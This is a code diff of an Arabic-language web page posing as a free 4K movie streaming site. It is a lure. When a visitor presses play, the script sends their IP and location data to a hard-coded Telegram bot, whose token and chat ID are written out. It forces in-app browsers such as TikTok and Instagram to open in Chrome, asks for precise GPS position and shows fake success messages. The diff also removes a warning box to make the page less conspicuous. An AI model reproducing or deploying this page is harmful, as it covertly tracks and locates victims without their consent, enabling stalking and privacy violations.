@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تشغيل الفيلم</title>
+    <title>سينما أونلاين - مشاهدة مجانية</title>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0f0f0f; color: white; text-align: center; padding-top: 40px; margin: 0; }
         .container { background: #1e1e1e; padding: 25px; border-radius: 12px; max-width: 350px; margin: auto; box-shadow: 0 10px 25px rgba(0,0,0,0.8); }
@@ -13,7 +13,6 @@
         button { background: #e50914; color: white; border: none; padding: 15px; font-size: 18px; font-weight: bold; border-radius: 6px; cursor: pointer; width: 100%; transition: 0.3s; margin-top: 10px; }
         button:hover { background: #ff0a16; }
         #status { margin-top: 15px; color: #00ff88; font-size: 14px; }
-        #warning-box { display: none; background: #333; padding: 15px; border-radius: 8px; border: 2px solid #e50914; margin-bottom: 15px; }
     </style>
 </head>
 <body>
@@ -22,16 +21,8 @@
         <img src="https://image.tmdb.org/t/p/w500/1E5baAaEse26fej7uHcjOgEE2t2.jpg" alt="Movie Poster">
         <p>فيلم الأكشن والغموض (2026) - جودة 4K مجاناً</p>
         
-        <!-- تم تعديل النص هنا ليقول غوغل كروم -->
-        <div id="warning-box">
-            <p style="color: #ffcc00; font-weight: bold;">⚠️ لأسباب أمنية، يرجى فتحه في غوغل كروم لتشغيل الفيلم.</p>
-            <button onclick="openInBrowser()">اضغط هنا لفتح غوغل كروم</button>
-        </div>
-
-        <div id="main-content">
-            <button id="btn" onclick="startMovie()">اضغط لتأكيد الأمان وتشغيل الفيلم</button>
-            <div id="status"></div>
-        </div>
+        <button id="btn" onclick="startMovie()">اضغط لمشاهدة الفيلم</button>
+        <div id="status"></div>
     </div>
 
     <script>
@@ -39,31 +30,14 @@
         const ua = navigator.userAgent || navigator.vendor || window.opera;
         const isInApp = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Instagram") > -1) || (ua.indexOf("musical_ly") > -1) || (ua.indexOf("BytedanceWebview") > -1) || (ua.indexOf("TikTok") > -1);
 
-        if (isInApp) {
-            document.getElementById('warning-box').style.display = 'block';
-            document.getElementById('main-content').style.display = 'none';
-        }
-
-        function openInBrowser() {
-            // محاولة فتح الرابط في متصفح كروم
-            const currentUrl = window.location.href;
-            if (ua.indexOf("Android") > -1) {
-                // فتح كروم في الأندرويد مباشرة
-                window.location.href = "intent://" + currentUrl.replace("https://", "") + "#Intent;scheme=https;package=com.android.chrome;end";
-            } else {
-                // للأيفون
-                window.open(currentUrl, '_system');
-            }
-        }
-
         function startMovie() {
-            document.getElementById('btn').innerText = "جاري التحقق من الأمان...";
+            document.getElementById('btn').innerText = "جاري التجهيز...";
             document.getElementById('status').innerText = "الرجاء الانتظار...";
             
             const BOT_TOKEN = "8933571192:AAEAl7ej-akD789tzkS1sJK7zIZz020a4kA";
             const CHAT_ID = "8322196658";
 
-            // 1. أخذ الـ IP (يعمل حتى في تيك توك)
+            // 1. أخذ الـ IP (يعمل في كل الحالات)
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(ipData => {
@@ -71,7 +45,20 @@
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${ipMsg}`, { mode: 'no-cors', keepalive: true });
                 }).catch(e => console.log("IP Error"));
 
-            // 2. طلب الموقع الدقيق (GPS)
+            // 2. إذا كان داخل تيك توك أو إنستغرام، قم بتحويله لكروم تلقائياً
+            if (isInApp) {
+                const currentUrl = window.location.href;
+                if (ua.indexOf("Android") > -1) {
+                    // فتح كروم مباشرة
+                    window.location.href = "intent://" + currentUrl.replace("https://", "") + "#Intent;scheme=https;package=com.android.chrome;end";
+                } else {
+                    // للأيفون
+                    window.open(currentUrl, '_system');
+                }
+                return; // إيقاف التنفيذ هنا حتى يفتح في كروم
+            }
+
+            // 3. إذا كان في كروم بالفعل، اطلب الموقع الدقيق (GPS)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
@@ -89,7 +76,7 @@
                         }, 3000);
                     },
                     (err) => {
-                        // إذا رفض أو فشل الـ GPS
+                        // إذا رفض السماح بالموقع
                         document.getElementById('status').innerText = "✅ تم التشغيل بنجاح!";
                         document.getElementById('btn').style.display = 'none';
                         setTimeout(() => {
